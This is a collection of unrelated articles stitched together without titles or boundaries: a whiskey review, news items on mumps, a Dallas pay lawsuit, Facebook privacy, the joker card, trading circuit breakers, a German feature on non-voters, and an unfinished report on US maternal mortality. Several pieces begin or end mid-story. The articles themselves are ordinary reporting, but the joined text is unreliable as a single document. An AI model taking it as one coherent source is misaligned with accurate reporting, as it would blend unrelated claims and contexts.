With strawberry banana Jolly Rancher in the nose , Dead Guy Whiskey does not smell anything like whiskey – it smells sacchariny and artificial .
The taste is not much better : fatty and overly sweet , limp and lacking any of the great qualities of a young whiskey .
If the Rogue White Rum has heads in it , the Dead Guy Whiskey seems to have tails and it ’s flat , candied finish is as underwhelming as its taste .
Dead Guy
Whiskey comes from the sweet wort ( minus the hops ) from Rogue ’s Dead Guy Ale and it ’s aged in lightly charred American White Oak .
That should be a nice recipe for success , but again , poor distilling obliterates strong elements .
Not Recommended
After tasting this series of spirits it is clear to me that all is not well in the house of Rogue .
Distiller John Couchot comes out of the world of chemistry and perhaps has n’t made the leap from scientist to artisan craftsman , or perhaps the real issue lies with the companies motto of ‘ get it out the door ’ and ‘ some people will love it and some people wo n’t ’ .
Unfortunately with spirits this poor , I ’m afraid the people who wo n’t like it will vastly outnumber the people who do .
Update : Since this original review Rouge has released the Oregon Single Malt Whiskey ( 80 proof ) .
It took the 2010 American Distilling Institute Gold Medal at the 2010 ADI conference .
For completeness sake I decided to give it a try .
The good news , it ’s not as bad as the Dead Guy Whiskey , the bad news , it ’s not legions better .
Sporting a very think amber color the Rouge Single Malt has been aged just three months in barrel .
The nose is strong banana with an undertone of barnyard animal .
The entry is syrupy sweet , almost like corn syrup or molasses .
There ’s not too much going on in the body of this whiskey and it finishes pretty hot with burning at the front of the mouth .
Not a whiskey I ’d recommend .

DUBLIN , Ireland , April 2 ( UPI ) -- Urologists at a hospital in Ireland report an increase in mumps - related testicle problems among teenage boys and young men .
Niall Davis teamed up with colleagues at the Mater Misericordiae University Hospital in Dublin and reviewed five decades ' worth of research and statistics , and found in some parts of the United Kingdom , MMR vaccine usage fell from 91 percent to 58 percent about 15 years ago because of a global shortage of the vaccine and concerns that the vaccine may have a link to autism .
Despite studies finding no MMR vaccine link to autism , some parents have not been vaccinating their children for measles , mumps and rubella , Davis said .

" Boys who did not receive the measles - mumps - rubella vaccine during the mid 1990s are now collecting in large numbers in secondary schools and colleges and this provides a perfect breeding ground for the virus , " Davis said in a statement .
" It is those unvaccinated boys that we are now seeing in our urology department .
It 's estimated that as many of 42 percent of patients with mumps experience at least one complication such as swollen testicles , aseptic meningitis , acute inflammation of the brain , deafness and pancreatitis .
The recent resurgence in the disease means that a significant proportion of 15 - to 24 - year - olds living in heavily populated environments are affected . "
The findings are published in the British Journal of Urology .
NEW YORK ( Reuters ) - A lawyer representing Dallas firefighters and police officers who filed a $ 1 billion lawsuit against the city on grounds they were cheated out of back pay said on Monday the city declined to enter settlement talks .
“ Hopefully the city will realize that we can put this all to rest if they just come to the table , ” said Jay Stewart , a lawyer whose firm represents 1,500 of the approximately 4,400 plaintiffs .
Dallas City Attorney Tom Perkins declined to comment on any talks .
The lawsuit dates back to the mid-1990s , when some Dallas firefighters sued the city , arguing that it had not honored a municipal ordinance requiring it to give different ranks the same raises .
The Texas Supreme Court is due to rule on the city ’s claim of immunity from the suit , which says the city broke a 1979 law that promised them pay differentials .
The court heard oral arguments in December , and typically rulings are issued at least four months after such presentations .
The court has no deadline for issuing a final decision .
“ It ’s always been our position that we ’re not trying to bankrupt the city , ” said Stewart .
“ We ’re asking the city to ... make good on their obligations to their first responders . ”
Late last week , Stewart amended his suit to include the mayor , city council and city manager of Dallas as defendants , claiming they exceeded their legal authority by failing to comply with the ordinance .
In a statement , Perkins , the city attorney called the amendments “ an attempt to keep ( the ) lawsuits alive regardless of how the Supreme Court may rule on the pending appeals .
“ Even if the city were somehow unable to obtain the dismissal of the new claims based on the city ’s governmental immunity and other jurisdictional grounds , the city remains confident that it will prove at trial that the Dallas voters approved only a one - time pay raise , ” Perkins said .
The case is City of Dallas v Kenneth E. Albert et al , No. 05-03-01297-CV .

Facing increasing pressure from the media and users , Facebook has called an all hands meeting tomorrow afternoon , at 4 PM Pacific , to discuss the company ’s overall privacy strategy according to sources inside the company .
Facebook has come under increasing scrutiny for a number of reasons and many were left with a sour taste in their mouth following a New York Times reader Q&A with Elliot Schrage , the company ’s Vice President for Public Policy .
While it ’s unknown what Facebook will announce during the meeting , it ’s pretty obvious that changes will need to be made if Facebook is going to regain users ’ trust .
The most likely change will come in the form of a temporary removal of the “ Instant Personalization ” service , or at the least , a shift to “ opt - in ” , something many privacy advocates have been calling for .
Even with the criticism surrounding Facebook ’s “ Instant Personalization ” , many privacy advocates want further changes involved with Facebook ’s new social plugins , as many of them function when a user is n’t logged in and there ’s no way for a user to opt - out from having their data being tracked .
While we have our own opinion as to what changes Facebook should make , it ’s clear that Facebook is feeling the pressure and thus the reason for holding tomorrow ’s meeting .
We ’ll be sure to keep you updated as the story unfolds .
Jokers are one of those funny things -- many decks do n't have jokers , and in most cases you can lose the jokers and it does n't matter .
So why include them ?
And while we 're on the topic , where did any of the cards in a deck come from ?
Why are there 52 cards , with four suits and 13 cards to a suit ?
According to Britannica.com , the 52 - card deck that we use today is a modification of part of the standard Tarot deck , made up of the Major Arcana and Minor Arcana , minus the knight cards .
Probably around the 15th century , the deck started settling into the modern form we know today .

The joker , however , did not appear until sometime around the 1860s .
At that time , the game of euchre was extremely popular ( it was later unseated by bridge ) .
In euchre , under the British rules , there is a card known as the Imperial Bower ( or Best Bower ) that trumps all others .
Decks of cards began to include a special Imperial Bower card , and it later morphed into the joker card that we know today .
According to this page :
The " Best Bower " was invented for use in the game of Euchre in which two of the Jacks are named Right and Left Bower ; this happened during the 1860s in the USA .
" Bower " is a corruption of the German word " Bauer " used in Alsace , from where Euchre or Juker originated as the ordinary word for " Jack . "
This card evolved into the Joker during the 1870s .
The Joker arrived in Europe in the 1880s along with the game of Poker .
It was gradually incorporated into French - suited packs with 52 cards .

When the New York exchange suspended trading Thursday , sellers simply moved to other exchanges with fewer restrictions .
In some cases , the supply of buyers on those exchanges already had been exhausted , causing the computerized trading programs to offer shares at lower and lower prices .
Some of the resulting downward spirals ended at one penny .
“ When the New York Stock Exchange went into slow motion , a system designed to stabilize trading actually backfired in practice , ” said James J. Angel , a professor at Georgetown University who studies financial markets .
“ No exchange should have an independent circuit breaker . ”
The S.E.C. , which oversees the nation ’s equity markets , requires a suspension in trading only in the event of a broad market collapse , defined as a drop of at least 10 percent in the Dow Jones industrial average , which is based on the share prices of 30 large American companies .
Other countries , like Germany , impose similar circuit breakers on trading in shares of any individual company that has a similar drop , but the S.E.C. has never done so .
A former S.E.C. official said the possibility had been discussed in recent years , but “ I do n’t think there was quite the urgency to deal with it . ”
The S.E.C. and the Commodity Futures Trading Commission said in a joint statement on Friday that the issue now had their attention .
“ We are scrutinizing the extent to which disparate trading conventions and rules across various markets may have contributed to the spike in volatility , ” the statement said .
“ This is inconsistent with the effective functioning of our capital markets and we will make whatever structural or other changes are needed . ”
Early this year , the S.E.C. also began a broad review of equity markets , including whether computerized trading is properly regulated .
Rote Zonen an der Wand .
" Beteiligung in Prozent " steht über der Grafik .
Rote Zonen finden sich auf den Karten der Wahlstatistiker in den Wahlämtern .
Rote Zonen bedeuten : hier , in diesen Wahlkreisen und Stimmbezirken haben die Wahlhelfer ganz besonders wenige Wähler , teilweise nur eine Handvoll Stimmen gezählt am vergangenen Sonntag .
Die roten Zonen breiten sich seit Jahren auf den Grafiken aus .
" Alle Staatsgewalt geht vom Volke aus ... "
Das Grundgesetz .
Artikel 20 , Absatz 2 :
" Sie wird vom Volke in Wahlen und Abstimmungen und durch besondere Organe der Gesetzgebung , der vollziehenden Gewalt und der Rechtsprechung ausgeübt . "
Und wenn das Volk sich verweigert ?
Am vergangenen Sonntag haben nur 59,3 Prozent der Wahlberechtigten in Nordrhein - Westfalen von diesem Recht Gebrauch gemacht .
Was bedeutet das ?
Fragten sich auch manche Politiker schon am Wahlabend .
Roland Giller etwa von der FDP in Lünen .
" Ich habe also in allen Podiumsdiskussionen zum Schluss immer gesagt : Im Prinzip ist es mir eigentlich egal , in der Demokratie , wen ihr wählt , aber ihr müsst hingehen , ihr müsst die Demokratie auch stützen .
Ich habe auch in Facebook über 3000 Kommentare gehabt , und da waren einige , die sagten ach ich mach da einen großen Strich durch , und dann habe ich hingeschrieben dann braucht ihr auch keine Demokratie ! "
13.270.933 Menschen waren am vergangenen Sonntag wahlberechtigt .
Sie durften jeweils zwei Stimmen abgegeben und damit die künftige Zusammensetzung des nordrhein - westfälischen Landtags bestimmen .
5.398.071 Menschen sind nicht an die Wahlurne gegangen , haben nicht ihre Stimmen abgegeben , haben Artikel 20 , Absatz 2 ignoriert , haben sich geweigert , die Staatsgewalt von sich ausgehen zu lassen , haben schlichtweg nicht mehr Demokratie gewagt , sich nicht als " Wir sind das Volk " verstanden .
5.398.071 Menschen , 40,7 Prozent der Wahlberechtigten in Nordrhein - Westfalen , sind zu Hause geblieben .
Warum ?
Achselzucken , auch bei jenen , die etwas davon verstehen .
Etwa bei Armin Schäfer vom Max - Planck - Institut für Gesellschaftsforschung in Köln :
So genau weiß das eigentlich niemand , sagt er .
Es gebe nur statistische Wahrscheinlichkeiten .
" Meine These wäre , dass es so ein gewisses Unbehagen an der Politik , Parteienverdrossenheit weit verbreitet ist , die übersetze ich aber in unterschiedlichem Maß in die Bereitschaft , zu wählen oder eben zu Hause zu bleiben .
Und bei Menschen mit geringer Bildung , die sich vielleicht auch nicht so stark für Politik interessieren , bedeutet das häufig , dass sie dann sagen wir bleiben zu Hause , Politik spielt für mein Leben ohnehin keine Rolle , es ändert sich nicht . "
Mitmenschen eben , die sich schlicht nicht für Politik interessieren .
Idioten ?
Das ist alles andere als ein Schimpfwort , das ist antike Geschichte : " Idiotes " , so hießen die von der Politik abgewandten Privatmenschen .
Sie waren im alten Athen - 5 . Jahrhundert vor Christus - verpönt .
Man hielt nicht viel von ihnen .
" Bei uns gilt einer , der dem politischen Leben ganz fernsteht , nicht als ein Mann ohne Ehrgeiz , sondern als unnützer Mensch . "
Der alte Perikles hat das gesagt , einer der Begründer der attischen Demokratie .
Und diese - nach seiner Ansicht - " unnützen Menschen " tun heutzutage im Grunde dasselbe .
Die da oben , sagen sie manchmal am Stammtisch , machen sowieso was sie wollen und sich selbst die Taschen voll .
Politikverdrossenheit auf Stammtischniveau .
Ein bisschen steckt dahinter auch die typisch deutsche Nörgelei .
" Also es gibt verschiedene Formen der Nichtwahl , den Nichtwähler gibt es gar nicht , also die Nichtwähler sind noch ein relativ unbekanntes Phänomen , jedenfalls aus Sicht der Politikwissenschaft , es gibt noch nicht so wahnsinnig viele Forschungen auf der individuellen Ebene dazu ; man kann viel mit Daten machen , aber auf der individuellen Ebene gibt es nicht viele Erkenntnisse über den Nichtwähler . "
Denn solche Studien sind aufwendig und nicht eben billig , erklärt der Duisburger Politikwissenschaftler Timo Grunden , und deswegen eben das Stochern im Nichtwählernebel .
Muss das Thema " Nichtwähler " den Parteien nicht eigentlich wichtig und teuer sein ?
Muss diese stärkste politische Kraft , eben die Partei der Nichtwähler , nicht im Vordergrund des politischen Interesses sehen ?
" Mein Eindruck ist , sie stehen eigentlich nicht im Vordergrund . "
Leo Flamm , landespolitischer Korrespondent der ARD in Düsseldorf .
" Die Zahl nimmt immer mehr zu , das ist richtig , die Nichtwähler sind fast eine eigene Partei , aber ich habe nicht den Eindruck , dass Journalisten und dass die Politik tatsächlich ernsthaft auf dieses Phänomen reagieren , sich ernsthaft damit auseinandersetzen , im Gegenteil , sie wirken immer beleidigt , wenn sie mit der Tatsache konfrontiert werden . "
Es ist kaum zu glauben , aber wahr : Das Phänomen des Nichtwählens wird immer größer und immer gefährlicher , dennoch gibt es eben offenbar auch dieses Nichts - davon - wissen - Wollen .
Deshalb fehlen wissenschaftlichen Grundlagen !
Stattdessen existieren nur statistische Auffälligkeiten , wie sie der Politologe Armin Schäfer vom Max - Planck - Institut beschreibt .
Die Gruppe der Nichtwähler sei äußerst heterogen .
" Wenn man 's aber ein bisschen sortiert nach Bildungsgrad oder nach Einkommensgrad , stellt man fest , dass die Wahrscheinlichkeit von Menschen mit geringer Bildung oder geringem Einkommen zu wählen deutlich niedriger liegt als die von Menschen mit hoher Bildung und hohem Einkommen .
Und das ist etwas , was noch nicht schon immer so war , sondern ein neuerer Trend . "
Das dokumentieren die roten Zonen auf den Karten der Wahlstatistiker .
Sie decken sich tatsächlich mit den sogenannten " sozialen Brennpunkten " - das ist es , was Schäfer und andere erwartet hatten , weil das Rot dieser Zonen seit Jahren immer dunkler wird .
Es gibt also einen ganz eindeutigen Zusammenhang zwischen " Ich bin arm " , " mir geht 's nicht gut " - und " ich gehe nicht wählen . "
Deswegen lohnt es sich auch , einen genaueren Blick auf eine dieser Zonen zu werfen .
Das Wahllokal 60901 im Kölner Stadtteil Chorweiler .
Vergangenen Sonntag , früher Nachmittag .
Wahlvorsteherin Maria Moldovanov und ihre fünf Helfer gleichen Wahlbenachrichtigungen mit Personalausweisen ab und geben den Stimmzettel für die Landtagswahl in NRW aus .
Seit am Morgen - wie es schon fast Tradition ist - die Rentner gewählt haben , ist es sehr ruhig geworden .
Die Wahlhelfer warten , trinken Kaffee , lesen und langweilen sich .
Hier , im Norden der Domstadt , ist es besonders schwierig , die Menschen an die Wahlurnen zu locken , weiß Maria Moldovanov .
Bei den Kommunalwahlen im vergangenen Jahr kamen gerade mal 20 Prozent der Wahlberechtigten , um im Bürgerzentrum ihre Stimme abzugeben .
Die Gründe dafür kennt die 57 - jährige Frührentnerin genau :
" Unwissenheit oder Desinteresse auch , Unsicherheit , viele wissen auch nicht mehr , was sie wählen sollen .
Die Leute sind unzufrieden .
Bevor sie dann falsche Kreuze machen , gehen sie lieber gar nicht . "
Im äußersten Norden Kölns wohnen Menschen aus gut Hundert verschiedenen Nationen - mehr als die Hälfte lebt von Hartz IV .
Um das flache Bürgerzentrum am Pariser Platz türmen sich die Hochhäuser .
Über 80 Prozent sind Sozialwohnungen .
Es ist eine trostlose Gegend , der Pariser ein kalter Platz : Ein paar Bäume , Ruhebänke , ein Kiosk , ein paar Kneipen und viel Beton .
Nicht gerade lebenswert , findet auch der neue Kölner Oberbürgermeister Jürgen Rothers von der SPD .
Er hat sich beim Amtsantritt im vergangenen Jahr vorgenommen hier , den Abrissbagger anrollen zu lassen , um Verwahrlosung und Kriminalität zu bekämpfen .
Wählen gehen ?
Das ist hier kein Thema für einen Sonntagnachmittag .
Während das Team um Maria Moldovanov im Bürgerzentrum auf Wahlwillige wartet , ist im " City Treff " schräg gegenüber deutlich mehr los .
Sonntags kostet das Bier nur einen Euro - die dunkle Eckkneipe ist gut besucht .
Vaclaw Peter lehnt an der
Theke und schaut auf einer Großleinwand Michael Schumacher zu , wie der bei der Formel 1 seine Runden dreht .
Wählen ?
Geht er schon seit 20 Jahren nicht mehr :
" Ich kriege jedes Mal diese Papier zum Wählen , aber ich glaube gar nichts mehr .
Die Politiker machen , was sie will , für uns macht gar nichts mehr .
Das ist nur pro forma so - Scheiße .
Dann schmeiß ich einfach das Papier weg . "
Der 56 - jährige Tscheche mit deutschem Pass schlägt den Kragen seiner dunkelbraunen Lederjacke hoch und verschränkt die Arme vor seinem Bauch .
Er lebt seit 20 Jahren in Deutschland .
Arbeit findet er schon lange nicht mehr .
360 Euro blieben ihm im Monat zum Leben , erzählt er , ein Spaß sei das nicht .
Einmal in der Woche trifft er sich mit Gleichgesinnten deshalb auf ein Bier - ein wenig leben wolle er ja auch noch .
Franz Lorenz neben ihm nickt zustimmend .
Auch der 53 - jährige , groß gewachsene Mann im leuchtend roten Polohemd geht seit Jahren nicht mehr wählen .
" Ich sehe das doch jetzt wieder hier mit Griechenland , wo sie auf Deutsch gesagt , alles in den Arsch gedäut kriegen .
So .
Und das kommt wieder auf uns .
So sehe ich das . "
Nicht weit vom " City Treff " stehen junge Männer vor einem Kiosk : Deutsche , Türken , Polen .
Lässig die Hände in die Jackentaschen gesteckt , cooler Blick , ihr Haar glänzt matt vom Haargel .
Aus einem Handy plärrt Musik .
Wählen ?
Wen denn und wofür ?
Der 20 - jährige Borahn glaubt nicht daran , dass ihm das irgendeinen Vorteil bringen würde .
Schon gar keinen Ausbildungsplatz .
80 Prozent der Hauptschüler haben in Chorweiler kaum eine Chance , eine Lehrstelle zu ergattern .
Für Borahn steht längst fest : Deutsche Politiker wissen nicht , was junge Migranten brauchen .
Doch auch der türkischstämmige Kandidat , den die SPD in Chorweiler extra aufgestellt hatte , kann ihn nicht motivieren :
" Im Endeffekt ändert sich hier gar nichts , egal ob das jetzt Merkel ist oder Gerhard Schröder war oder dieser - wie heißt er noch mal - Kohl .
Die sind alle das Gleiche , weil die im Endeffekt von irgendwelchen Machthabern , die die Fäden ziehen , gelenkt werden .
Ich glaub einfach daran , dass sich da nichts ändern wird . "
Borahn und seine Freunde wollen noch ins Fitnessstudio .
So gesehen hätten sie auch gar keine Zeit , um noch wählen zu gehen .
Während die jungen Männer über den großen Platz in Richtung U - Bahn schlendern , schaut Jacqueline Schäfer ihren Kinder Jason und Cecile beim Spielen zu .
Die 24 - jährige ist alleinerziehend , ihre Kinder - drei und vier Jahre alt - seien noch zu klein , sie könne nicht arbeiten gehen .
Auch sie lebt von Hartz IV .
Ein einziges
Mal ist sie wählen gegangen , damals als sie 18 wurde .
Nur Mal zum Ausprobieren , wie es sich anfühlt , erwachsen zu sein .
" Da habe ich die Chance mal genutzt , aber im Nachhinein habe ich gedacht , das war total unnötig .
Es geht mir mittlerweile am Allerwertesten vorbei . "
Politik ?
Sie schüttelt den Kopf : Interessiert sie nicht .
Da steige doch niemand mehr durch .
Dass das Kindergeld angehoben wurde , sei zwar gut gewesen , auf der anderen Seite aber werde direkt wieder beim Arbeitslosengeld gekürzt .
Anstatt wählen zu gehen , hat sie den
Tag lieber entspannt mit ihren Kindern verbracht , war Kaffeetrinken .
" Das hat uns allen ganz gut getan .
Und dann bin ich durch Zufall eben an so ' nem Schild vorbeigekommen .
Und dann fiel mir ein :
Ach ja , heute wären auch Wahlen gewesen .
Also , ich hatte da auch gar nicht mehr dran gedacht . "
Vergessen , nicht daran gedacht - die Wahlvorsteherin Maria Moldovanov ärgert sich .
Auch ein Großteil ihrer Nachbarn ist nicht im Wahllokal erschienen , dabei hatte sie sie noch extra daran erinnert .
Hat erklärt , wie wichtig eine solche
Wahl doch sei , wenn man Dinge verändern will , anstatt nur zu meckern .
Um Punkt 18
Uhr zieht sie die Eingangstür vom Bürgerzentrum Chorweiler zu und dreht den Schlüssel um .
Etwas ratlos schaut sie auf die zwei großen Kartons vor sich auf dem Tisch :
" Wir sind alle sehr enttäuscht über unsere Mitbürger und dass wir immer noch sehr viele Stimmzettel übrig haben .
Wir hätten uns ein bisschen mehr Beteiligung gewünscht . "
Nichtwähler - in Chorweiler sind sie längst in der Mehrheit .
Im Wahllokal von Maria Moldovanov gaben von 1009 Wahlberechtigten nur 261 ihre Stimme ab .
Zum Vergleich : In ganz Köln gingen immerhin 59 Prozent der Wahlberechtigten wählen .
Doch die Tendenz nimmt auch hier ab : 2005 - bei der letzten Landtagswahl - waren es noch vier Prozent mehr .
Es gibt aber auch noch ganz andere Stimmen in Köln - Chorweiler .
Hartz IV , Arbeitslosigkeit ? , was hat das mit meinem Wahlrecht zu tun ? , fragt ein alter Mann , der keinen Ärger haben und deshalb nicht ins Mikrofon sprechen will .
" Politikverdrossenheit ?
Unkenntnis ? - Alles Blödsinn ! "
Das richtige
Wort sei vielmehr eine - Zitat - " Scheiß- egal - Stimmung " .
Der alte Mann schimpft über die , die über alles meckern , vor allem über die da oben .
Aber keiner kriege den Hintern hoch !
Sagt er ärgerlich und geht .
Seine Beobachtungen decken sich - zumindest inhaltlich - mit den gängigen Vorstellungen der Sozialwissenschaft : Arbeitslosigkeit und Armut haben den Rückzug aus dem gesellschaftlichen Leben zur Folge .
Und wählen gehen und sich an Wahlen beteiligen ist eben in ganz hohem Umfang ein gesellschaftlicher Akt .
" Bei allen Wahlen und bei allen Wahlarten der letzten Jahre war es so , dass in Großstädten , dort , wo soziale Probleme besonders stark sind , wenige Menschen gewählt haben , und die Unterschiede sind wirklich riesig groß , bei der Bundestagswahl 2009 beispielsweise in Köln lagen 46 Prozentpunkte zischen der Wahlbeteiligung in den Stadtteilen mit der höchsten und dem mit der niedrigsten Wahlbeteiligung , und die niedrigste Wahlbeteiligung war natürlich im Stadtteil mit hoher Arbeitslosigkeit , Armut und ähnlichen Problemen " , "
erklärt Armin Schäfer vom Max - Planck - Institut .
Es gibt einen weiteren Grund für das dunkle Nichtwählerrot auf der Karte der Wahlstatistiker , einen demografischen :
In Chorweiler - und dies gilt für viele sogenannte soziale Brennpunkte - ist der Jugendanteil besonders hoch , dagegen gibt es verhältnismäßig wenig alte Leute .
Die Jungen aber , sagt die Statistik , sind eher wahlmüde - während die Alten fleißig wählen gehen .
( Frau ) " " Ich gehe persönlich hin , weil mir meine Stimme sehr viel wert ist , ich will nicht , dass die verloren geht . "
( Frau ) " Ich fühl mich doch verpflichtet selbstverständlich meine Stimme abzugeben , wenn sie alle zu Hause bleiben , wird das doch nix . "
Diese Stimmen gibt es auch .
Und nach wie vor ist es die Mehrheit , die hier im Sinne des Wortes " einstimmt " .
Im Übrigen , daran erinnert der Duisburger Politikwissenschaftler Timo Grunden , ist ausgerechnet der obrigkeitstreue Deutsche eher ein fleißiger Wähler :
" Also die Deutschen glauben immer noch in ihrer Mehrheit , wählen gehen sei eine Art Bürgerpflicht , und deswegen gehen sie auch hin .
Im internationalen Vergleich muss man sagen ist die deutsche Wahlbeteiligung recht hoch , im europäischen Ausland und erst Recht in den USA haben wir zum Teil Wahlbeteiligungsquoten von 30 Prozent . "
Das aber dürfe kein Grund zur Sorglosigkeit sein , so sehen das Timo Grunden und seine Kollegen .
Die Partei der Nichtwähler wachse .
Und das Desinteresse der Politik , von dem der Korrespondent Leo Flamm gesprochen hatte , könne für das demokratische Gefüge eben doch gefährlich werden .
Und was könnte die Politik , der einzelne Politiker nun dagegen tun ?
" Was er tun könnte , weiß ich nicht , ich habe Politiker gefragt , wie sie sich denn mit dem Phänomen auseinandersetzen würden .
Und die Antworten , die dann kommen , hören sich an wie aus dem standardisierten Kanon , die heißen : wir betreiben Wahlkampf , wir versuchen , mit den Menschen ins Gespräch zu kommen , wir versuchen uns ihrer Probleme anzunehmen , aber das reicht offenbar nicht , das reicht den Menschen nicht , wir kommen so nicht ran und wir tun das Mögliche , aber die Wähler sind eigentlich so blöd , das nicht zu erkennen . "
Das spricht für pure Hilflosigkeit .
Grunden : " Wir haben ja auch bei der letzten Bundestagswahl erlebt , dass die Nichtwähler schon in die Strategie einkalkuliert werden , also der berühmte Wahlkampf von Frau Merkel der Union zielt auf eine so genannte asymmetrische Demobilisierung : Ich schläfere die Wähler ein , und wenn ich mehr Wähler der SPD einschläfere als meine , dann werde ich die Wahl gewinnen , und so war 's dann auch . "
In Nordrhein - Westfalen sind am vergangenen Sonntag 5.398.071 Menschen nicht an die Urne gegangen .
Aber diesmal wohl nicht aufgrund einer gewollten Demobilisierung , sondern aufgrund einer völlig gescheiterten Mobilisierung .
" Mobilisierung hat immer was damit zu tun , Leute dort abzuholen , wo sie sind , "
erklärt Armin Schäfer vom Max - Planck - Institut .
" Also es reicht ja nicht , wenn schöne Programme entworfen werden , die dann aber niemanden erreichen , niemanden ansprechen .
Also ein Stück weit ist das die Aufgabe von Parteien und demokratischen Parteien , zu vereinfachen , aber das nicht auf eine Weise zu tun , die wir populistisch nennen . "
Und das ist offenbar vor allem den Christdemokraten missglückt , 330.000 typische CDU - Wähler sind am vergangenen Sonntag ins Lager der Nichtwähler gewechselt .
Zum ersten Mal in der Geschichte hat nicht die SPD unter der niedrigen Wahlbeteiligung gelitten - sondern die CDU .
Die schwarz - gelbe Regierung wurde von der stärksten politischen Kraft im Lande gestürzt : von den Nichtwählern .
Zur Erinnerung : 330.000 CDU - Wähler sind zu Hause geblieben .
Die hätten für eine absolute Mehrheit ihrer Partei sorgen können .
Und dennoch darf die Wahlabstinenz nicht etwa als eine Art demokratischen Handelns begriffen werden .
Dieser Wahlberechtigte bringt es auf den Punkt :
( Mann ) " Wenn man nicht wählen geht , dann kommt vielleicht eine Partei , die man nicht gewählt hätte dann , an die Macht , wenn man so will . "
Wer nicht wählen geht , überlässt anderen sein Schicksal , so einfach ist das .
Und alle Wahlen mit niedrigen Beteiligungen zeigen : Das Nichtwählen stärkt vor allem die Ränder , jene Splitterparteien , die vielleicht nur so gerade noch als demokratisch bezeichnet werden können .
In NRW haben diese " Anderen " immerhin 60.000 Stimmen aus dem Lager der Nichtwähler mobilisieren können .
Aber was tun ?
Eine Wahlpflicht einführen ?
Der Politologe Timo Grunden schüttelt den Kopf :
" Es gehört zu einer Demokratie dazu , sich auch dazu zu entscheiden , nicht zu einer
Wahl zu gehen , auch das ist ein politisches Statement . "
Der Ball liegt also im Feld der Politik .
Die Parteien sollten sich tunlichst beeilen , mehr über dieses - viel zu unbekannte Wesen Nichtwähler herauszufinden .
Bis dahin gilt für alle der bekannte Satz :
Jürgen Becker : " Demokratie ist doch ein Verfahren , das garantiert , dass wir nicht besser regiert werden , als wir es verdienen . "
After a difficult pregnancy , weeks of bed rest and an emergency cesarean section , Liz Logelin got only a quick peek at her daughter before the newborn , healthy but premature , was whisked away to the neonatal unit .
The next day , a nurse arrived with a wheelchair to take the first - time mother to see her baby .
With husband Matt by her side , Logelin rose , took a few steps , said , “ I feel light - headed , ” and died .
She was 30 .
“ She never got to hold her baby , ” said Matt Logelin , who lives in Los Angeles with the couple ’s daughter Madeline , now 2 .
“ That is one of the hardest things for me . ”
Each day in the U.S. , two women die of problems related to pregnancy or childbirth .
The numbers have been rising , for reasons that are not entirely clear .
After plunging in the 1900s , maternal mortality rates in California tripled between 1996 and 2006 , from 5.6 deaths per 100,000 births to 16.9 .
Nationally , the rate , defined as deaths from obstetrical causes within one year of giving birth , rose from 7.6 per 100,000 to 13.3 per 100,000 .
For each death , experts estimate , there are about 50 instances of complications related to pregnancy or childbirth that are life - threatening or cause permanent damage .
According to a study published last year , such “ near misses ” — including kidney failure , respiratory distress syndrome , shock and the need for blood transfusions and ventilation — rose 25 % from the late 1990s to 2005 .
Childbirth - linked deaths are still rare in the U.S. , numbering about 90 women a year for California .
But health experts believe that at least one - third are preventable .
Furthermore , they add , it is a problem typically associated with poor nations , not a rich , industrial country like the U.S.
It is one of the primary indicators of public health that improves dramatically as countries develop and strengthen access to , and quality of , medical care .
Though the U.S. spends more per birth than any other nation , maternal mortality is higher here than in 40 other industrialized countries , including Croatia , Hungary and Macedonia , and is double that of Canada and much of Western Europe .
That the United States is backsliding in this most basic of healthcare measures has triggered attention and alarm in medical circles .
In January , the Joint Commission , an independent organization that accredits and certifies healthcare organizations and programs , issued a “ sentinel event alert ” warning of the rising maternal mortality rates .
In March , the human rights organization Amnesty International released its own report , “ Deadly Delivery , ” calling for sweeping changes in maternal healthcare in the U.S .
The California Department of Public Health has commissioned a statewide review of medical charts in maternal death cases to identify reasons for the rise and seek ways to improve .
“ Mothers should n’t die in childbirth , ” said Dr. Elliott Main , chief of obstetrics at Sutter Health and director of the ongoing California review .
The trend , he said , may signal a much larger problem with U.S. maternal healthcare .
Possible reasons
Experts do n’t yet know what has caused the increase in deaths , but there are plenty of potential explanations .
A 1999 change in how maternal mortality statistics are calculated is believed to be responsible for about 30 % of the bump ; that still leaves the bulk unexplained .
Health experts point to a mismatch between the way American medicine delivers babies and the changing profile of the American mother .
Traditionally , physicians have viewed pregnant women as both young and healthy .
In this country , that is no longer the case for a growing portion of expectant mothers .
More women today are giving birth in their 30s and 40s , when risks of complications during pregnancy and childbirth significantly increase .
Almost 25 % of women of childbearing age are obese and thus at higher risk for conditions such as diabetes and high blood pressure .
Physicians have n’t adapted their approach to childbirth to accommodate these new risks , maternal health experts said .
Some experts implicate the rise in rates of cesarean sections , which account for one - third of all births — up from one - fifth in 1997 .
Although many are done to save the life of a mother and her baby , perhaps half are elective , meaning the surgery is medically unnecessary .
After one C-section , cesareans are typically recommended for subsequent pregnancies .
Yet these are major operations and “ should not be taken lightly , ” said Dr. Michael Lu , a UCLA associate professor of obstetrics and gynecology .
Each additional cesarean increases the risk of placental complications that threaten the lives of mother and baby .
The induction or prompting of labor by medication , which is sometimes medically advisable but more often performed for the doctor ’s or patient ’s convenience , has climbed so steeply — it now occurs in 22 % of births — that the American College of Obstetricians and Gynecologists felt compelled to advise its members last year to avoid inductions before 39 weeks ’ gestation .
When labor is induced a week or so before the due date , the uterus may not be ready , leading to prolonged labor .
After delivery , the exhausted muscle may not contract properly to stop bleeding .
Blood can no longer clot and becomes the consistency of water .
Staffing of maternity wards is also a serious problem , said Nan Strauss , a senior researcher at Amnesty International and a coauthor of the organization ’s March report on maternal deaths .
“ What we heard over and over is that facilities are underfunded in a lot of areas and providers are stretched thin , ” Strauss said .
“ They ca n’t provide the best care they want to provide . ”
Finally , a mistaken belief that childbirth is no more dangerous than having a tooth pulled may have led to complacency in a field often chosen by doctors and nurses because it is a happy medical specialty .
Electronic monitoring , Lu said , may have the unintended consequence of making the monitoring of women during labor so passive that they may be neglected , with warning signs missed .
Hereditary condition
The death certificates are a litany of awful events .
Thromboembolisms — blood clots that break off and lodge in the heart or lungs — are the leading cause of maternal mortalities , accounting for 20 % of cases .
Hemorrhage , a profuse loss of blood , causes about 17 % .
Next , at 16 % , is preeclampsia , a condition of high blood pressure and leaky kidneys that can lead to seizure , organ failure and death .
Liz Logelin had a hereditary condition that increased her risk of clots , her husband said .
But that did n’t raise much concern for the couple or her doctor , he added .
Liz was in great shape .
She hiked regularly in Runyon Canyon and worked out with a personal trainer .
She did n’t smoke or use drugs .
But the pregnancy was tough .
In her sixth month , she was told that she had low levels of amniotic fluid , which can harm the baby .
The umbilical cord was wrapped around the baby ’s neck .
